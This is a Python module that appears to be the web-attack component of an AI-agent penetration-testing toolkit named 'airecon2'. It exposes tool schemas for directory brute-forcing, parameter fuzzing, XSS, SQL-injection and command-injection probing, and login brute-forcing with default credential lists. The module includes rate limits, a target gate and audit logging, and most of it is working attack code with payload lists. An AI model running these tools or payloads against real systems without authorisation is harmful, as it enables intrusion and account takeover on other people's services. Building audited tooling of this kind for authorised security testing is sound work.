#airecon2 web offensive tools - rate-limited, capped, audited.
import json
import time
import urllib.request
import urllib.error
from urllib.parse import urlparse, urlencode

from .gate import check_target, _audit

_MAX_REQUESTS = 300       # hard cap per tool call
_DELAY = 0.05             # 20 req/s max
UA = "airecon2-offsec/0.2 (authorized testing)"

_XSS_PROBES = [
    "<script>alert(1)</script>", '"><svg onload=alert(1)>', "javascript:alert(1)",
    "<img src=x onerror=alert(1)>", "{{7*7}}", "${7*7}",
]
_SQLI_PROBES = [
    "' OR '1'='1", "1' ORDER BY 10--", "1 UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)--", "1; SELECT 1--",
]
_CMD_PROBES = [   # time-based + echo-based, non-destructive
    "; echo airecon2_ce", "| echo airecon2_ce", "$(echo airecon2_ce)",
    "; ping -n 1 127.0.0.1", "| sleep 3", "$(sleep 3)",
]
_COMMON_PARAMS = ["id", "q", "search", "page", "user", "name", "file", "msg", "redirect", "next"]
_WORDLIST = [
    "admin", "login", "wp-admin", "dashboard", "api", "backup", ".env", ".git",
    "config", "phpmyadmin", "test", "dev", "staging", "old", "admin.php",
    "admin.html", "server-status", ".htaccess", "web.config", "db.sql",
    "robots.txt", "sitemap.xml", "uploads", "static", "assets", "docs",
    "api/v1", "api/v2", "graphql", "actuator", "console", "debug",
]


def _req(url: str, method: str = "GET", timeout: int = 10):
    r = urllib.request.Request(url, method=method, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, len(resp.read()), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, 0, dict(e.headers or {})
    except Exception as e:
        return 0, 0, {"error": str(e)}


def _paced(count: int) -> bool:
    if count > _MAX_REQUESTS:
        return False
    time.sleep(_DELAY)
    return True


def dirbuster(base_url: str, wordlist: list | None = None, **_) -> str:
    host = check_target(base_url)
    _audit("DIRBUSTER", f"{host}")
    words = wordlist or _WORDLIST
    base = base_url.rstrip("/") + "/"
    found, count = [], 0
    # baseline 404 shape
    b_status, b_len, _ = _req(base + "___airecon2_nope___")
    for w in words:
        count += 1
        if not _paced(count):
            break
        s, ln, _h = _req(base + w)
        # hit = different status than baseline, or same status but very different size
        if s and (s != b_status or abs(ln - b_len) > 200):
            found.append({"path": "/" + w, "status": s, "bytes": ln})
    return json.dumps({"target": host, "checked": count, "found": found}, indent=1)


def param_fuzz(url: str, **_) -> str:
    host = check_target(url)
    _audit("PARAM_FUZZ", f"{host}")
    sep = "&" if "?" in url else "?"
    results = []
    count = 0
    for p in _COMMON_PARAMS:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{p}=airecon2probe"
        s, ln, _h = _req(u)
        results.append({"param": p, "status": s, "bytes": ln,
                        "reflected": "airecon2probe" in str(_h)})
    return json.dumps({"target": host, "probes": results}, indent=1)


def xss_probe(url: str, param: str = "q", **_) -> str:
    host = check_target(url)
    _audit("XSS_PROBE", f"{host} param={param}")
    sep = "&" if "?" in url else "?"
    hits = []
    count = 0
    for payload in _XSS_PROBES:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{param}={urlencode({param: payload})[len(param)+1:]}"
        s, ln, _h = _req(u)
        body = ""
        try:
            r = urllib.request.Request(u, headers={"User-Agent": UA})
            with urllib.request.urlopen(r, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        reflected = payload in body
        if reflected:
            hits.append({"payload": payload, "status": s, "note": "reflected unencoded"})
    return json.dumps({"target": host, "param": param, "reflected_hits": hits,
                       "note": "reflection is a lead; verify exploitability manually"}, indent=1)


def sqli_probe(url: str, param: str = "id", **_) -> str:
    host = check_target(url)
    _audit("SQLI_PROBE", f"{host} param={param}")
    sep = "&" if "?" in url else "?"
    base_s, base_len, _ = _req(url)
    hits = []
    count = 0
    for payload in _SQLI_PROBES:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{param}={payload.replace(' ', '%20')}"
        t0 = time.time()
        s, ln, _h = _req(u, timeout=15)
        dt = time.time() - t0
        sig = []
        if s != base_s and s:
            sig.append(f"status {base_s}->{s}")
        if abs(ln - base_len) > 300:
            sig.append(f"size {base_len}->{ln}")
        if "SLEEP" in payload and dt > 2.8:
            sig.append(f"time-based ({dt:.1f}s)")
        if sig:
            hits.append({"payload": payload, "signals": sig})
    return json.dumps({"target": host, "param": param, "sqli_leads": hits,
                       "note": "signals are leads; confirm with sqlmap or manual testing"}, indent=1)


def cmd_probe(url: str, param: str = "host", **_) -> str:
    host = check_target(url)
    _audit("CMD_PROBE", f"{host} param={param}")
    sep = "&" if "?" in url else "?"
    hits = []
    count = 0
    for payload in _CMD_PROBES:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
        t0 = time.time()
        s, ln, _h = _req(u, timeout=15)
        dt = time.time() - t0
        try:
            r = urllib.request.Request(u, headers={"User-Agent": UA})
            with urllib.request.urlopen(r, timeout=15) as resp:
                body = resp.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
        sig = []
        if "airecon2_ce" in body:
            sig.append("echo marker in response (RCE likely)")
        if ("sleep" in payload or "ping" in payload) and dt > 2.8:
            sig.append(f"time-based ({dt:.1f}s)")
        if sig:
            hits.append({"payload": payload, "signals": sig})
    return json.dumps({"target": host, "param": param, "cmd_leads": hits}, indent=1)


def login_bruteforce(url: str, param_user: str = "username",
                     param_pass: str = "password",
                     users: list | None = None, passwords: list | None = None, **_) -> str:
    host = check_target(url)
    _audit("LOGIN_BRUTE", f"{host} users={len(users or [])} passwords={len(passwords or [])}")
    users = users or ["admin", "test", "administrator"]
    passwords = passwords or ["admin", "password", "123456", "test", "admin123", "letmein"]
    sep = "&" if "?" in url else "?"
    tries, hits = 0, []
    bl_s, bl_len, _ = _req(url, method="POST")
    for u in users:
        for pw in passwords:
            tries += 1
            if tries > _MAX_REQUESTS or not _paced(tries):
                break
            data = urlencode({param_user: u, param_pass: pw}).encode()
            r = urllib.request.Request(url, data=data, method="POST",
                                       headers={"User-Agent": UA,
                                                "Content-Type": "application/x-www-form-urlencoded"})
            try:
                with urllib.request.urlopen(r, timeout=10) as resp:
                    s, ln, loc = resp.status, len(resp.read()), resp.headers.get("Location", "")
            except urllib.error.HTTPError as e:
                s, ln, loc = e.code, 0, e.headers.get("Location", "") if e.headers else ""
            except Exception:
                continue
            if (s and s not in (bl_s, 200, 401, 403)) or (loc and "login" not in loc.lower()):
                hits.append({"user": u, "password": pw, "status": s, "location": loc,
                             "note": "differs from failed-login baseline - verify manually"})
    return json.dumps({"target": host, "attempts": tries, "candidate_creds": hits}, indent=1)


SCHEMAS = [
    {"type": "function", "function": {"name": "dirbuster", "description": "Brute-force common paths/directories on an authorized target.",
        "parameters": {"type": "object", "properties": {"base_url": {"type": "string"}}, "required": ["base_url"]}}},
    {"type": "function", "function": {"name": "param_fuzz", "description": "Discover hidden parameters by probing common names.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "xss_probe", "description": "Test a parameter for reflected XSS payloads (non-destructive).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "sqli_probe", "description": "Test a parameter for SQL injection signals (error/time-based, non-destructive).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "cmd_probe", "description": "Test a parameter for OS command injection signals (echo/time-based).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "login_bruteforce", "description": "Brute-force a login form with a small credential list (audited).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param_user": {"type": "string"}, "param_pass": {"type": "string"}},
                       "required": ["url"]}}},
]

DISPATCH = {
    "dirbuster": dirbuster, "param_fuzz": param_fuzz, "xss_probe": xss_probe,
    "sqli_probe": sqli_probe, "cmd_probe": cmd_probe, "login_bruteforce": login_bruteforce,
}
